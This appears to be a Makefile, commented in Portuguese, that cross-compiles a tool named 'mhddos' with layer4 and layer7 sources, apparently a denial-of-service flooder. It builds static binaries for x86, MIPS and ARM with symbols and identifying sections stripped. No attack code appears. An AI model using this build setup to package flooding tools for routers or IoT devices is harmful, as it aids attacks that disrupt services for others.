# Configurações Gerais
# -Os = otimiza para TAMANHO em vez de velocidade
# -ffunction-sections -fdata-sections = separa cada função/dado em seção própria
# -fno-asynchronous-unwind-tables = remove tabelas de unwind (exceções)
# -fno-ident = remove identificação do compilador
CFLAGS = -Wall -Os -pthread -D_GNU_SOURCE \
         -ffunction-sections -fdata-sections \
         -fno-asynchronous-unwind-tables -fno-ident \
         -fomit-frame-pointer -fmerge-all-constants \
         -fno-unwind-tables

# -static = tudo dentro do binário
# -Wl,--gc-sections = remove seções não usadas (dead code elimination)
# -Wl,-s = strip durante o link (remove símbolos)
# -Wl,-z,norelro = remove RELRO (menor overhead)
LDFLAGS = -static -lpthread -lm \
          -Wl,--gc-sections -Wl,-s -Wl,-z,norelro

SRCS = main.c utils.c layer4.c layer7.c
TARGET = mhddos

# Lista de Compiladores (Cross-Compilers)
CC_X86     = gcc
CC_MIPS    = mips-linux-gnu-gcc
CC_MIPSEL  = mipsel-linux-gnu-gcc
CC_ARMV7   = arm-linux-gnueabihf-gcc
CC_ARM64   = aarch64-linux-gnu-gcc

# Alvo padrão: compila para todos
all: x86 mips mipsel armv7 arm64

x86:
	$(CC_X86) $(CFLAGS) $(SRCS) -o $(TARGET)_x64 $(LDFLAGS)
	-strip -S --strip-unneeded --remove-section=.note --remove-section=.comment --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.eh_frame --remove-section=.eh_frame_hdr $(TARGET)_x64 2>/dev/null || true

mips:
	$(CC_MIPS) $(CFLAGS) $(SRCS) -o $(TARGET)_mips $(LDFLAGS)
	-mips-linux-gnu-strip -S --strip-unneeded --remove-section=.note --remove-section=.comment --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag $(TARGET)_mips 2>/dev/null || true

mipsel:
	$(CC_MIPSEL) $(CFLAGS) $(SRCS) -o $(TARGET)_mipsel $(LDFLAGS)
	-mipsel-linux-gnu-strip -S --strip-unneeded --remove-section=.note --remove-section=.comment --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag $(TARGET)_mipsel 2>/dev/null || true

armv7:
	$(CC_ARMV7) $(CFLAGS) $(SRCS) -o $(TARGET)_armv7 $(LDFLAGS)
	-arm-linux-gnueabihf-strip -S --strip-unneeded --remove-section=.note --remove-section=.comment --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag $(TARGET)_armv7 2>/dev/null || true

arm64:
	$(CC_ARM64) $(CFLAGS) $(SRCS) -o $(TARGET)_arm64 $(LDFLAGS)
	-aarch64-linux-gnu-strip -S --strip-unneeded --remove-section=.note --remove-section=.comment --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag $(TARGET)_arm64 2>/dev/null || true

clean:
	rm -f $(TARGET)_*

.PHONY: all clean x86 mips mipsel armv7 arm64